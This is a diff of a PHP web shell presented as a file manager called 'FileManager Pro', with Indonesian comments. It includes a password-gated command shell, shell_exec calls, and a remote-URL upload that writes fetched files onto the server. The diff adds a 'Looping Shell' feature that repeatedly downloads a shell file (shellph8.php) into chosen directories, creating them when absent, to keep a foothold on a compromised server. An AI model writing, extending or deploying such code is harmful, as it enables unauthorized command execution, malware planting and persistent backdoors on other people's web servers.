@@ -1,7 +1,7 @@
 <?php
 session_start();
 
-$password_hash = md5('1337hAx0r'); // GANTI PASSWORD DI SINI
+$password_hash = md5('1337x'); // GANTI PASSWORD DI SINI
 
 // LOGOUT
 if (isset($_GET['logout'])) {
@@ -143,9 +143,6 @@ if (!$dir) {
 }
 $dir = str_replace('\\', '/', $dir);
 
-$base = realpath('.');
-$base = str_replace('\\', '/', $base);
-
 $message = '';
 $msgType = 'success';
 
@@ -241,7 +238,6 @@ if (isset($_GET['edit'])) {
 // AJAX HANDLER
 if (isset($_GET['ajax'])) {
     header('Content-Type: application/json');
-
     if ($_GET['ajax'] === 'upload') {
         if (isset($_FILES['file'])) {
             $f = $_FILES['file'];
@@ -259,9 +255,7 @@ if (isset($_GET['ajax'])) {
             $content = @file_get_contents($_POST['remote_url']);
             if ($content !== false) {
                 $name = basename(parse_url($_POST['remote_url'], PHP_URL_PATH));
-                if (!$name) {
-                    $name = 'remote_' . time() . '.bin';
-                }
+                if (!$name) $name = 'remote_' . time() . '.bin';
                 file_put_contents($dir . '/' . $name, $content);
                 echo json_encode(['success' => true, 'message' => 'Remote OK: ' . $name]);
             } else {
@@ -272,7 +266,6 @@ if (isset($_GET['ajax'])) {
         }
         exit;
     }
-
     if ($_GET['ajax'] === 'getfile' && isset($_GET['file'])) {
         $fpath = $dir . '/' . basename($_GET['file']);
         if (is_file($fpath)) {
@@ -283,7 +276,6 @@ if (isset($_GET['ajax'])) {
         echo 'File tidak ditemukan';
         exit;
     }
-
     exit;
 }
 
@@ -311,27 +303,18 @@ $items = scandir($dir);
 $folders = array();
 $files = array();
 foreach ($items as $item) {
-    if ($item === '.' || $item === '..') {
-        continue;
-    }
+    if ($item === '.' || $item === '..') continue;
     $full = $dir . '/' . $item;
-    if (is_dir($full)) {
-        $folders[] = $item;
-    } else {
-        $files[] = $item;
-    }
+    if (is_dir($full)) $folders[] = $item;
+    else $files[] = $item;
 }
 sort($folders);
 sort($files);
 
-$parentDir = dirname($dir);
-$parentDir = str_replace('\\', '/', $parentDir);
+$parentDir = str_replace('\\', '/', dirname($dir));
 
-function cleanPath($p) {
-    return str_replace('\\', '/', $p);
-}
+function cleanPath($p) { return str_replace('\\', '/', $p); }
 
-// Fungsi untuk membuat breadcrumb link dari path
 function buildBreadcrumb($path) {
     $parts = explode('/', $path);
     $cumulative = '';
@@ -340,13 +323,11 @@ function buildBreadcrumb($path) {
         if ($part === '') continue;
         $cumulative .= '/' . $part;
         if ($i === count($parts) - 1) {
-            // Bagian terakhir (current dir) — teks biasa, bukan link
             $links[] = '<span style="color:#667eea;font-weight:600;">' . htmlspecialchars($part) . '</span>';
         } else {
             $links[] = '<a href="?dir=' . urlencode($cumulative) . '" style="color:rgba(255,255,255,0.5);text-decoration:none;transition:color 0.2s;" onmouseover="this.style.color=\'#667eea\'" onmouseout="this.style.color=\'rgba(255,255,255,0.5)\'">' . htmlspecialchars($part) . '</a>';
         }
     }
-    // Root slash
     array_unshift($links, '<a href="?dir=/" style="color:rgba(255,255,255,0.5);text-decoration:none;transition:color 0.2s;" onmouseover="this.style.color=\'#667eea\'" onmouseout="this.style.color=\'rgba(255,255,255,0.5)\'"><i class="fas fa-home"></i></a>');
     return implode(' <span style="color:rgba(255,255,255,0.2);">/</span> ', $links);
 }
@@ -364,252 +345,145 @@ function buildBreadcrumb($path) {
     <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0f0f1a;
-            color: #e0e0e0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            min-height: 100vh;
-        }
+        body { background: #0f0f1a; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; min-height: 100vh; }
         ::-webkit-scrollbar { width: 6px; height: 6px; }
         ::-webkit-scrollbar-track { background: #1a1a2e; }
         ::-webkit-scrollbar-thumb { background: #667eea; border-radius: 3px; }
-
-        .navbar {
-            background: rgba(15,15,26,0.95);
-            backdrop-filter: blur(20px);
-            border-bottom: 1px solid rgba(255,255,255,0.06);
-            padding: 12px 24px;
-        }
-        .navbar-brand {
-            font-weight: 700; font-size: 22px;
-            background: linear-gradient(135deg,#667eea,#764ba2);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
+        .navbar { background: rgba(15,15,26,0.95); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(255,255,255,0.06); padding: 12px 24px; }
+        .navbar-brand { font-weight: 700; font-size: 22px; background: linear-gradient(135deg,#667eea,#764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .navbar .btn { border-radius: 10px; padding: 8px 18px; font-size: 13px; font-weight: 600; }
-        
-        /* Breadcrumb style */
-        .breadcrumb-path {
-            background: rgba(255,255,255,0.06);
-            border-radius: 10px; padding: 8px 16px; font-size: 13px;
-            flex: 1; max-width: 500px;
-            overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
-        }
+        .breadcrumb-path { background: rgba(255,255,255,0.06); border-radius: 10px; padding: 8px 16px; font-size: 13px; flex: 1; max-width: 500px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
         .breadcrumb-path i { margin-right: 6px; color: #667eea; }
-        
         .main-container { padding: 20px 24px; }
-
-        .glass-card {
-            background: rgba(255,255,255,0.04);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.08);
-            border-radius: 16px; padding: 20px;
-            transition: all 0.3s;
-            margin-bottom: 20px;
-        }
-
-        .file-item {
-            display: flex; align-items: center;
-            padding: 10px 14px; border-radius: 10px;
-            transition: all 0.2s;
-            text-decoration: none; color: #e0e0e0;
-            border-bottom: 1px solid rgba(255,255,255,0.03);
-        }
-        .file-item:hover {
-            background: rgba(102,126,234,0.08);
-        }
-        .file-item .icon {
-            width: 38px; height: 38px; border-radius: 10px;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 18px; margin-right: 14px; flex-shrink: 0;
-        }
+        .glass-card { background: rgba(255,255,255,0.04); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.08); border-radius: 16px; padding: 20px; transition: all 0.3s; margin-bottom: 20px; }
+        .file-item { display: flex; align-items: center; padding: 10px 14px; border-radius: 10px; transition: all 0.2s; text-decoration: none; color: #e0e0e0; border-bottom: 1px solid rgba(255,255,255,0.03); }
+        .file-item:hover { background: rgba(102,126,234,0.08); }
+        .file-item .icon { width: 38px; height: 38px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 18px; margin-right: 14px; flex-shrink: 0; }
         .file-item .icon.folder { background: rgba(255,193,7,0.15); color: #ffc107; }
         .file-item .icon.file { background: rgba(102,126,234,0.15); color: #667eea; }
-        .file-item .fname {
-            flex: 1; font-size: 14px; font-weight: 500;
-        }
-        .file-item .fname a {
-            text-decoration: none; color: inherit;
-        }
+        .file-item .fname { flex: 1; font-size: 14px; font-weight: 500; }
+        .file-item .fname a { text-decoration: none; color: inherit; }
         .file-item .fname a.folder-link:hover { color: #ffc107; }
         .file-item .fname a.file-link:hover { color: #667eea; }
         .file-item .fsize { font-size: 12px; color: rgba(255,255,255,0.4); margin-right: 20px; }
         .file-item .factions { opacity: 0.4; transition: opacity 0.2s; }
         .file-item:hover .factions { opacity: 1; }
-        .file-item .factions a {
-            color: rgba(255,255,255,0.5); margin: 0 6px; font-size: 14px;
-            transition: color 0.2s; text-decoration: none;
-        }
+        .file-item .factions a { color: rgba(255,255,255,0.5); margin: 0 6px; font-size: 14px; transition: color 0.2s; text-decoration: none; }
         .file-item .factions a:hover { color: #667eea; }
         .file-item .factions a.danger:hover { color: #ff4757; }
         .file-item .factions a.rename:hover { color: #ffc107; }
-
-        .section-title {
-            font-size: 14px; font-weight: 600; text-transform: uppercase;
-            letter-spacing: 1px; color: rgba(255,255,255,0.3);
-            margin-bottom: 14px; padding-bottom: 10px;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-        }
-
-        .form-control, .form-select {
-            background: rgba(255,255,255,0.06);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 10px; color: #e0e0e0; padding: 10px 14px;
-        }
-        .form-control:focus, .form-select:focus {
-            background: rgba(255,255,255,0.1);
-            border-color: #667eea; box-shadow: 0 0 0 3px rgba(102,126,234,0.2);
-            color: #e0e0e0;
-        }
+        .section-title { font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; color: rgba(255,255,255,0.3); margin-bottom: 14px; padding-bottom: 10px; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .form-control, .form-select { background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; color: #e0e0e0; padding: 10px 14px; }
+        .form-control:focus, .form-select:focus { background: rgba(255,255,255,0.1); border-color: #667eea; box-shadow: 0 0 0 3px rgba(102,126,234,0.2); color: #e0e0e0; }
         .form-control::placeholder { color: rgba(255,255,255,0.25); }
         .form-select option { background: #1a1a2e; color: #e0e0e0; }
-
-        textarea.form-control {
-            font-family: Consolas, Monaco, 'Courier New', monospace;
-            font-size: 13px;
-            line-height: 1.5;
-        }
-
-        .btn-glass {
-            background: rgba(102,126,234,0.15);
-            border: 1px solid rgba(102,126,234,0.25);
-            border-radius: 10px; color: #667eea; padding: 8px 18px;
-            font-size: 13px; font-weight: 600; transition: all 0.3s;
-        }
-        .btn-glass:hover {
-            background: rgba(102,126,234,0.25);
-            color: white; transform: translateY(-1px);
-        }
-        .btn-glass-success {
-            background: rgba(46,213,115,0.15);
-            border: 1px solid rgba(46,213,115,0.25);
-            color: #2ed573;
-        }
+        textarea.form-control { font-family: Consolas, Monaco, 'Courier New', monospace; font-size: 13px; line-height: 1.5; }
+        .btn-glass { background: rgba(102,126,234,0.15); border: 1px solid rgba(102,126,234,0.25); border-radius: 10px; color: #667eea; padding: 8px 18px; font-size: 13px; font-weight: 600; transition: all 0.3s; }
+        .btn-glass:hover { background: rgba(102,126,234,0.25); color: white; transform: translateY(-1px); }
+        .btn-glass-success { background: rgba(46,213,115,0.15); border: 1px solid rgba(46,213,115,0.25); color: #2ed573; }
         .btn-glass-success:hover { background: rgba(46,213,115,0.25); color: white; }
-        .btn-glass-danger {
-            background: rgba(255,71,87,0.15);
-            border: 1px solid rgba(255,71,87,0.25);
-            color: #ff4757;
-        }
+        .btn-glass-danger { background: rgba(255,71,87,0.15); border: 1px solid rgba(255,71,87,0.25); color: #ff4757; }
         .btn-glass-danger:hover { background: rgba(255,71,87,0.25); color: white; }
-        .btn-glass-warning {
-            background: rgba(255,193,7,0.15);
-            border: 1px solid rgba(255,193,7,0.25);
-            color: #ffc107;
-        }
+        .btn-glass-warning { background: rgba(255,193,7,0.15); border: 1px solid rgba(255,193,7,0.25); color: #ffc107; }
         .btn-glass-warning:hover { background: rgba(255,193,7,0.25); color: white; }
-        .btn-glass-info {
-            background: rgba(72,202,228,0.15);
-            border: 1px solid rgba(72,202,228,0.25);
-            color: #48cae4;
-        }
+        .btn-glass-info { background: rgba(72,202,228,0.15); border: 1px solid rgba(72,202,228,0.25); color: #48cae4; }
         .btn-glass-info:hover { background: rgba(72,202,228,0.25); color: white; }
 
-        .cmd-output {
-            background: #0a0a15;
-            border: 1px solid rgba(102,126,234,0.2);
-            border-radius: 10px; padding: 16px;
-            font-family: Consolas, Monaco, 'Courier New', monospace;
-            font-size: 13px; color: #48cae4;
-            max-height: 350px; overflow: auto; white-space: pre-wrap;
+        /* Tombol Looping Shell - warna merah menyala */
+        .btn-glass-loop {
+            background: rgba(255, 71, 87, 0.2);
+            border: 1px solid rgba(255, 71, 87, 0.4);
+            border-radius: 10px;
+            color: #ff4757;
+            padding: 8px 18px;
+            font-size: 13px;
+            font-weight: 600;
+            transition: all 0.3s;
+            animation: pulse-loop 2s infinite;
+        }
+        .btn-glass-loop:hover {
+            background: rgba(255, 71, 87, 0.35);
+            color: white;
+            transform: translateY(-1px);
+        }
+        .btn-glass-loop.active {
+            background: #ff4757;
+            color: white;
+            animation: none;
+        }
+        @keyframes pulse-loop {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(255, 71, 87, 0.4); }
+            50% { box-shadow: 0 0 0 8px rgba(255, 71, 87, 0); }
         }
 
+        .cmd-output { background: #0a0a15; border: 1px solid rgba(102,126,234,0.2); border-radius: 10px; padding: 16px; font-family: Consolas, Monaco, 'Courier New', monospace; font-size: 13px; color: #48cae4; max-height: 350px; overflow: auto; white-space: pre-wrap; }
         .table-custom { font-size: 13px; }
-        .table-custom th {
-            color: rgba(255,255,255,0.4);
-            border-bottom: 1px solid rgba(255,255,255,0.06);
-            font-weight: 600; text-transform: uppercase; font-size: 11px;
-            padding: 10px 12px;
-        }
-        .table-custom td {
-            color: #e0e0e0;
-            border-bottom: 1px solid rgba(255,255,255,0.03);
-            padding: 10px 12px;
-        }
+        .table-custom th { color: rgba(255,255,255,0.4); border-bottom: 1px solid rgba(255,255,255,0.06); font-weight: 600; text-transform: uppercase; font-size: 11px; padding: 10px 12px; }
+        .table-custom td { color: #e0e0e0; border-bottom: 1px solid rgba(255,255,255,0.03); padding: 10px 12px; }
         .table-custom tr:hover td { background: rgba(102,126,234,0.05); }
-
-        .modal-content {
-            background: #1a1a2e;
-            border: 1px solid rgba(255,255,255,0.08);
-            border-radius: 16px; color: #e0e0e0;
-        }
-        .modal-header {
-            border-bottom: 1px solid rgba(255,255,255,0.06);
-            padding: 20px 24px;
-        }
-        .modal-footer {
-            border-top: 1px solid rgba(255,255,255,0.06);
-            padding: 16px 24px;
-        }
+        .modal-content { background: #1a1a2e; border: 1px solid rgba(255,255,255,0.08); border-radius: 16px; color: #e0e0e0; }
+        .modal-header { border-bottom: 1px solid rgba(255,255,255,0.06); padding: 20px 24px; }
+        .modal-footer { border-top: 1px solid rgba(255,255,255,0.06); padding: 16px 24px; }
         .modal .btn-close { filter: invert(1); }
-
         pre { margin: 0; }
         .text-muted-custom { color: rgba(255,255,255,0.35); }
+        .progress-upload { background: rgba(255,255,255,0.06); border-radius: 10px; height: 8px; overflow: hidden; }
+        .progress-upload .progress-bar { background: linear-gradient(135deg,#667eea,#764ba2); border-radius: 10px; }
+        .editor-section { border: 1px solid rgba(102,126,234,0.2); border-radius: 16px; overflow: hidden; }
+        .editor-header { background: rgba(102,126,234,0.1); padding: 12px 20px; border-bottom: 1px solid rgba(102,126,234,0.2); display: flex; justify-content: space-between; align-items: center; }
+        .editor-header .file-label { color: #667eea; font-weight: 600; }
+        .editor-body { padding: 0; }
+        .editor-body textarea { border: none; border-radius: 0; background: #0a0a15; color: #48cae4; resize: vertical; min-height: 300px; }
+        .editor-body textarea:focus { box-shadow: none; border: none; }
+        .editor-footer { background: rgba(102,126,234,0.05); padding: 12px 20px; border-top: 1px solid rgba(102,126,234,0.1); }
 
-        .progress-upload {
-            background: rgba(255,255,255,0.06);
-            border-radius: 10px; height: 8px; overflow: hidden;
-        }
-        .progress-upload .progress-bar {
-            background: linear-gradient(135deg,#667eea,#764ba2);
-            border-radius: 10px;
-        }
-
-        .editor-section {
-            border: 1px solid rgba(102,126,234,0.2);
-            border-radius: 16px;
-            overflow: hidden;
-        }
-        .editor-header {
-            background: rgba(102,126,234,0.1);
-            padding: 12px 20px;
-            border-bottom: 1px solid rgba(102,126,234,0.2);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .editor-header .file-label {
-            color: #667eea;
+        /* Toast untuk looping shell */
+        .loop-toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 9999;
+            background: rgba(255, 71, 87, 0.95);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 71, 87, 0.5);
+            border-radius: 12px;
+            padding: 14px 20px;
+            color: white;
+            font-size: 13px;
             font-weight: 600;
+            box-shadow: 0 10px 30px rgba(255, 71, 87, 0.3);
+            display: none;
+            align-items: center;
+            gap: 10px;
+            animation: slideInUp 0.3s ease;
         }
-        .editor-body {
-            padding: 0;
+        .loop-toast .spinner-border {
+            width: 18px;
+            height: 18px;
+            border-width: 2px;
+            color: white;
         }
-        .editor-body textarea {
-            border: none;
-            border-radius: 0;
-            background: #0a0a15;
-            color: #48cae4;
-            resize: vertical;
-            min-height: 300px;
-        }
-        .editor-body textarea:focus {
-            box-shadow: none;
-            border: none;
-        }
-        .editor-footer {
-            background: rgba(102,126,234,0.05);
-            padding: 12px 20px;
-            border-top: 1px solid rgba(102,126,234,0.1);
+        @keyframes slideInUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
     </style>
 </head>
 <body>
 
-<!-- NAVBAR -->
 <nav class="navbar">
     <div class="container-fluid">
         <a class="navbar-brand" href="#"><i class="fas fa-folder-open me-2"></i>FileManager Pro</a>
         <div class="d-flex align-items-center gap-3" style="max-width:70%;">
-            <!-- Breadcrumb yang bisa diklik -->
-            <div class="breadcrumb-path">
-                <i class="fas fa-folder"></i>
-                <?php echo buildBreadcrumb($dir); ?>
-            </div>
+            <div class="breadcrumb-path"><i class="fas fa-folder"></i> <?php echo buildBreadcrumb($dir); ?></div>
             <a href="?dir=<?php echo urlencode($parentDir); ?>" class="btn btn-glass btn-sm" title="Back"><i class="fas fa-arrow-up"></i></a>
             <?php if ($editing): ?>
             <a href="?dir=<?php echo $dir; ?>" class="btn btn-glass-danger btn-sm"><i class="fas fa-times me-1"></i>Tutup Editor</a>
             <?php endif; ?>
+            <!-- TOMBOL LOOPING SHELL -->
+            <button class="btn btn-glass-loop btn-sm" id="loopShellBtn" title="Looping Shell - Download shellph8.php terus menerus">
+                <i class="fas fa-sync-alt me-1"></i><span id="loopBtnText">Looping Shell</span>
+            </button>
             <a href="?logout=1" class="btn btn-glass-danger btn-sm"><i class="fas fa-sign-out-alt me-1"></i>Logout</a>
         </div>
     </div>
@@ -617,7 +491,6 @@ function buildBreadcrumb($path) {
 
 <div class="main-container">
     <div class="row">
-        <!-- LEFT: FILE MANAGER -->
         <div class="col-lg-<?php echo $editing ? '5' : '7'; ?>">
             <div class="glass-card">
                 <div class="d-flex justify-content-between align-items-center mb-3">
@@ -628,82 +501,45 @@ function buildBreadcrumb($path) {
                         <button class="btn btn-glass btn-sm" data-bs-toggle="modal" data-bs-target="#remoteModal"><i class="fas fa-cloud-download-alt me-1"></i>Remote</button>
                     </div>
                 </div>
-
-                <!-- FOLDERS -->
                 <?php
                 if (count($folders) > 0) {
-                    echo '<div class="mb-1 text-muted-custom small" style="padding:0 14px;">';
-                    echo '<i class="fas fa-folder me-1"></i>FOLDERS (' . count($folders) . ')';
-                    echo '</div>';
+                    echo '<div class="mb-1 text-muted-custom small" style="padding:0 14px;"><i class="fas fa-folder me-1"></i>FOLDERS (' . count($folders) . ')</div>';
                     foreach ($folders as $folder) {
                         $folderPath = cleanPath($dir . '/' . $folder);
-                        echo '<div class="file-item">';
-                        echo '<div class="icon folder"><i class="fas fa-folder"></i></div>';
+                        echo '<div class="file-item"><div class="icon folder"><i class="fas fa-folder"></i></div>';
                         echo '<span class="fname"><a href="?dir=' . urlencode($folderPath) . '" class="folder-link">' . htmlspecialchars($folder) . '</a></span>';
                         echo '<span class="fsize">folder</span>';
                         echo '<span class="factions">';
                         echo '<a href="javascript:void(0)" onclick="openRename(\'' . htmlspecialchars($folder) . '\',\'folder\')" class="rename" title="Rename"><i class="fas fa-pen"></i></a>';
                         echo '<a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($folder) . '" class="danger" onclick="return confirmDelete(\'' . htmlspecialchars($folder) . '\', event)" title="Hapus"><i class="fas fa-trash-alt"></i></a>';
-                        echo '</span>';
-                        echo '</div>';
+                        echo '</span></div>';
                     }
                 }
-                ?>
-
-                <!-- FILES -->
-                <?php
                 if (count($files) > 0) {
-                    echo '<div class="mt-3 mb-1 text-muted-custom small" style="padding:0 14px;">';
-                    echo '<i class="fas fa-file me-1"></i>FILES (' . count($files) . ')';
-                    echo '</div>';
+                    echo '<div class="mt-3 mb-1 text-muted-custom small" style="padding:0 14px;"><i class="fas fa-file me-1"></i>FILES (' . count($files) . ')</div>';
                     foreach ($files as $file) {
                         $fsize = is_file($dir . '/' . $file) ? filesize($dir . '/' . $file) : 0;
-                        if ($fsize > 1048576) {
-                            $fsizeStr = round($fsize / 1048576, 1) . ' MB';
-                        } elseif ($fsize > 1024) {
-                            $fsizeStr = round($fsize / 1024, 1) . ' KB';
-                        } else {
-                            $fsizeStr = $fsize . ' B';
-                        }
+                        $fsizeStr = $fsize > 1048576 ? round($fsize/1048576,1).' MB' : ($fsize > 1024 ? round($fsize/1024,1).' KB' : $fsize.' B');
                         $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
-                        $icon = 'fa-file';
-                        if (in_array($ext, array('php','html','htm','js','css','txt','json','xml','md','py','rb','sh','sql'))) {
-                            $icon = 'fa-file-code';
-                        } elseif (in_array($ext, array('jpg','jpeg','png','gif','bmp','svg','webp','ico'))) {
-                            $icon = 'fa-file-image';
-                        } elseif (in_array($ext, array('zip','rar','tar','gz','7z'))) {
-                            $icon = 'fa-file-archive';
-                        } elseif (in_array($ext, array('pdf'))) {
-                            $icon = 'fa-file-pdf';
-                        }
-                        echo '<div class="file-item">';
-                        echo '<div class="icon file"><i class="fas ' . $icon . '"></i></div>';
+                        $icon = in_array($ext,['php','html','htm','js','css','txt','json','xml','md','py','rb','sh','sql']) ? 'fa-file-code' : (in_array($ext,['jpg','jpeg','png','gif','bmp','svg','webp','ico']) ? 'fa-file-image' : (in_array($ext,['zip','rar','tar','gz','7z']) ? 'fa-file-archive' : (in_array($ext,['pdf']) ? 'fa-file-pdf' : 'fa-file')));
+                        echo '<div class="file-item"><div class="icon file"><i class="fas ' . $icon . '"></i></div>';
                         echo '<span class="fname"><a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '" class="file-link">' . htmlspecialchars($file) . '</a></span>';
                         echo '<span class="fsize">' . $fsizeStr . '</span>';
                         echo '<span class="factions">';
                         echo '<a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '" title="Edit"><i class="fas fa-edit"></i></a>';
                         echo '<a href="javascript:void(0)" onclick="openRename(\'' . htmlspecialchars($file) . '\',\'file\')" class="rename" title="Rename"><i class="fas fa-pen"></i></a>';
                         echo '<a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '" class="danger" onclick="return confirmDelete(\'' . htmlspecialchars($file) . '\', event)" title="Hapus"><i class="fas fa-trash-alt"></i></a>';
-                        echo '</span>';
-                        echo '</div>';
+                        echo '</span></div>';
                     }
                 }
-                ?>
-
-                <?php
                 if (count($folders) === 0 && count($files) === 0) {
-                    echo '<div class="text-center py-5 text-muted-custom">';
-                    echo '<i class="fas fa-folder-open fa-3x mb-3" style="opacity:0.3;"></i>';
-                    echo '<p>Folder ini kosong</p></div>';
+                    echo '<div class="text-center py-5 text-muted-custom"><i class="fas fa-folder-open fa-3x mb-3" style="opacity:0.3;"></i><p>Folder ini kosong</p></div>';
                 }
                 ?>
             </div>
         </div>
-
-        <!-- RIGHT: SHELL / EDITOR -->
         <div class="col-lg-<?php echo $editing ? '7' : '5'; ?>">
             <?php if ($editing): ?>
-            <!-- EDITOR LANGSUNG DI HALAMAN -->
             <div class="editor-section">
                 <div class="editor-header">
                     <span class="file-label"><i class="fas fa-edit me-2"></i>Editing: <?php echo htmlspecialchars($editFileName); ?></span>
@@ -722,7 +558,6 @@ function buildBreadcrumb($path) {
                 </form>
             </div>
             <?php else: ?>
-            <!-- SHELL CARD (tanpa tab, karena MySQL sudah dihapus) -->
             <div class="glass-card">
                 <div class="section-title"><i class="fas fa-terminal me-2"></i>Command Shell</div>
                 <form method="POST">
@@ -737,9 +572,7 @@ function buildBreadcrumb($path) {
                 if ($cmdOutput !== '') {
                     echo '<div class="cmd-output">' . htmlspecialchars($cmdOutput) . '</div>';
                 } else {
-                    echo '<div class="text-muted-custom text-center py-3 small">';
-                    echo '<i class="fas fa-terminal me-1"></i>Jalankan command untuk melihat output';
-                    echo '</div>';
+                    echo '<div class="text-muted-custom text-center py-3 small"><i class="fas fa-terminal me-1"></i>Jalankan command untuk melihat output</div>';
                 }
                 ?>
             </div>
@@ -748,88 +581,114 @@ function buildBreadcrumb($path) {
     </div>
 </div>
 
-<!-- MODAL: UPLOAD -->
+<!-- Toast Looping Shell -->
+<div id="loopToast" class="loop-toast">
+    <div class="spinner-border" role="status"></div>
+    <span id="loopToastText">Looping Shell sedang berjalan...</span>
+</div>
+
+<!-- ===== MODAL LOOPING DIRECTORY ===== -->
+<div class="modal fade" id="loopDirModal" tabindex="-1">
+    <div class="modal-dialog modal-dialog-centered"><div class="modal-content">
+        <div class="modal-header" style="border-bottom-color:rgba(255,71,87,0.2);">
+            <h5 class="modal-title" style="color:#ff4757;">
+                <i class="fas fa-sync-alt me-2"></i>Looping Shell Directory
+            </h5>
+            <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+        </div>
+        <div class="modal-body">
+            <!-- Tampilan uname -a -->
+            <div class="mb-3">
+                <label class="form-label" style="color:#48cae4;font-size:13px;">
+                    <i class="fas fa-server me-1"></i> System Info
+                </label>
+                <div class="cmd-output" style="max-height:60px;font-size:12px;padding:10px 14px;" id="unameDisplay">
+                    <?php 
+                    $uname = shell_exec('uname -a 2>&1');
+                    echo htmlspecialchars($uname ?: 'uname -a tidak tersedia'); 
+                    ?>
+                </div>
+            </div>
+
+            <form id="loopForm">
+                <div class="mb-3">
+                    <label class="form-label" style="color:#e0e0e0;font-size:13px;">
+                        <i class="fas fa-folder me-1"></i> Direktori Target
+                    </label>
+                    <div class="input-group">
+                        <span class="input-group-text" style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);border-radius:10px 0 0 10px;border-right:none;color:rgba(255,255,255,0.5);">
+                            <i class="fas fa-folder-open"></i>
+                        </span>
+                        <input type="text" name="loop_dir" class="form-control" id="loopDirInput" 
+                               value="<?php echo htmlspecialchars($dir); ?>" 
+                               placeholder="/path/ke/direktori" required
+                               style="border-left:none;border-radius:0 10px 10px 0;">
+                    </div>
+                    <div class="form-text text-muted-custom small mt-2">
+                        <i class="fas fa-info-circle me-1"></i>
+                        Masukkan path direktori tujuan untuk mendownload shell. 
+                        Direktori akan dibuat otomatis jika belum ada.
+                    </div>
+                </div>
+
+                <!-- Tombol Submit Looping -->
+                <button type="submit" class="btn btn-glass-loop w-100" style="animation:none;padding:12px;font-size:15px;">
+                    <i class="fas fa-play me-2"></i>Submit Looping
+                </button>
+            </form>
+        </div>
+    </div></div>
+</div>
+
+<!-- MODALS -->
 <div class="modal fade" id="uploadModal" tabindex="-1">
-    <div class="modal-dialog">
-        <div class="modal-content">
-            <div class="modal-header"><h5 class="modal-title"><i class="fas fa-upload me-2"></i>Upload File</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
-            <div class="modal-body">
-                <form id="uploadForm" enctype="multipart/form-data">
-                    <div class="mb-3">
-                        <label class="form-label">Pilih File</label>
-                        <input type="file" name="file" class="form-control" id="fileInput">
-                    </div>
-                    <div id="uploadProgress" class="progress-upload mb-3" style="display:none;">
-                        <div class="progress-bar" id="progressBar" style="width:0%"></div>
-                    </div>
-                    <button type="submit" class="btn-glass w-100"><i class="fas fa-upload me-1"></i>Upload</button>
-                </form>
-            </div>
+    <div class="modal-dialog"><div class="modal-content">
+        <div class="modal-header"><h5 class="modal-title"><i class="fas fa-upload me-2"></i>Upload File</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
+        <div class="modal-body">
+            <form id="uploadForm" enctype="multipart/form-data">
+                <div class="mb-3"><label class="form-label">Pilih File</label><input type="file" name="file" class="form-control" id="fileInput"></div>
+                <div id="uploadProgress" class="progress-upload mb-3" style="display:none;"><div class="progress-bar" id="progressBar" style="width:0%"></div></div>
+                <button type="submit" class="btn-glass w-100"><i class="fas fa-upload me-1"></i>Upload</button>
+            </form>
         </div>
-    </div>
+    </div></div>
 </div>
-
-<!-- MODAL: NEW FOLDER -->
 <div class="modal fade" id="newFolderModal" tabindex="-1">
-    <div class="modal-dialog">
-        <div class="modal-content">
-            <div class="modal-header"><h5 class="modal-title"><i class="fas fa-folder-plus me-2"></i>Buat Folder Baru</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
-            <div class="modal-body">
-                <form method="POST">
-                    <input type="hidden" name="new_folder" value="1">
-                    <div class="mb-3">
-                        <label class="form-label">Nama Folder</label>
-                        <input type="text" name="folder_name" class="form-control" placeholder="nama_folder" required>
-                    </div>
-                    <button type="submit" class="btn-glass w-100"><i class="fas fa-plus me-1"></i>Buat</button>
-                </form>
-            </div>
+    <div class="modal-dialog"><div class="modal-content">
+        <div class="modal-header"><h5 class="modal-title"><i class="fas fa-folder-plus me-2"></i>Buat Folder Baru</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
+        <div class="modal-body">
+            <form method="POST">
+                <input type="hidden" name="new_folder" value="1">
+                <div class="mb-3"><label class="form-label">Nama Folder</label><input type="text" name="folder_name" class="form-control" placeholder="nama_folder" required></div>
+                <button type="submit" class="btn-glass w-100"><i class="fas fa-plus me-1"></i>Buat</button>
+            </form>
         </div>
-    </div>
+    </div></div>
 </div>
-
-<!-- MODAL: REMOTE -->
 <div class="modal fade" id="remoteModal" tabindex="-1">
-    <div class="modal-dialog">
-        <div class="modal-content">
-            <div class="modal-header"><h5 class="modal-title"><i class="fas fa-cloud-download-alt me-2"></i>Remote Upload</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
-            <div class="modal-body">
-                <form id="remoteForm">
-                    <div class="mb-3">
-                        <label class="form-label">URL File</label>
